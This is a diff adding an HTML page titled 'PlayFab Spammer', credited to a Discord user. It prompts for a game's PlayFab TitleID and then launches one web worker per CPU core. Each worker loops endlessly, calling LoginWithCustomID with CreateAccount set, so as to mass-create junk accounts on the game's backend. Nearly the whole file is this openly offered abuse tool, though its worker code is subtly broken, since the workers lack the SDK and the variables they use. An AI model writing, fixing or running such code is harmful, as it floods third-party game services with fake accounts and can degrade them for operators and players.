@@ -1,1 +1,48 @@
+<html>
+<head>
+    <title>PlayFab Spammer</title>
+    <script src="https://download.playfab.com/PlayFabClientApi.js"></script>
+</head>
+<body>
+    <h1>PlayFab Spammer</h1>
+    <p>Created by @.index | <a href="https://discord.gg/GSWSahAmVU">https://discord.gg/GSWSahAmVU</a></p>
 
+    <script>
+        console.log("PlayFab Spammer made by, @.index | https://discord.gg/GSWSahAmVU");
+
+        PlayFab.settings.titleId = prompt('TitleID:');
+        var name = temp = prompt('CustomID Name:');
+
+        console.log(PlayFab.settings.titleId + " | Spamming with " + name);
+
+        function callback(result, error) {
+            if (result) {
+                console.log(PlayFab.settings.titleId + " | Created " + name);
+            }
+            if (error) {
+                console.log(PlayFab.settings.titleId + " | Could not create " + name);
+            }
+        }
+
+        function spam() {
+            while (true) {
+                var name = temp + Math.random().toString(16).substr(2, 5).toUpperCase();
+                var request = {
+                    TitleId: PlayFab.settings.titleId,
+                    CustomId: name,
+                    DisplayName: name,
+                    CreateAccount: true
+                };
+                PlayFabClientSDK.LoginWithCustomID(request, callback);
+            }
+        }
+
+        var numThreads = navigator.hardwareConcurrency || 4;
+        var threads = [];
+        for (var i = 0; i < numThreads; i++) {
+            var thread = new Worker(URL.createObjectURL(new Blob(['(' + spam.toString() + ')();'], { type: 'text/javascript' })));
+            threads.push(thread);
+        }
+    </script>
+</body>
+</html>
